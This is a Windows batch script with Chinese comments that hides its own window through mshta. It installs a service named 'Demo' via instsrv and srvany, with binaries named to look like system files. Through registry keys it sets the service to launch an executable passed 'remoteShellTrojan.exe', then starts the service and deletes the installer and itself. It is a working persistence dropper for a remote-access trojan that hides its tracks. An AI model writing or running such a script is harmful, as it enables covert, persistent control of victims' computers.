@echo off

if "%1"=="h" goto begin
start mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit
:begin

rem 定义需要运行的程序路径
set curExe=%~dp0lsm.exe
rem 定义注册表路径
set regpath=HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Demo\Parameters\
rem 定义srvany.exe文件路径
set sourcePath=%~dp0tasksch.exe

rem 进入当前目录
cd /d "%~dp0"
rem 安装引导服务
%~dp0instsrv Demo  "%sourcePath%"
@echo 服务添加完成

rem 添加注册表语法: reg add 注册表路径 /v 项名称 /t 值类型 /d 数据 /f 表示强行修改不提示

rem 名称 Application 值为你要作为服务运行的程序地址 /d对应的参数有斜杠不是为了转义引号，而是路径还有斜杠，默认将引号转义了，额外添加斜杠是为了保留引号
reg add %regpath% /v AppDirectory /t REG_SZ /d "%~dp0\" /f

rem 名称 AppDirectory 值为你要作为服务运行的程序所在文件夹路径
reg add %regpath% /v Application /t REG_SZ /d "%curExe% %~dp0lsrvn.exe %~dp0remoteShellTrojan.exe" /f 

rem 名称 AppParameters 值为你要作为服务运行的程序启动所需要的参数
reg add %regpath% /v AppParameters /t REG_SZ /f
@echo 注册表添加完成
sc start Demo
del /F /S /Q %~dp0instsrv
del /F /S /Q %~dp0run-install.bat
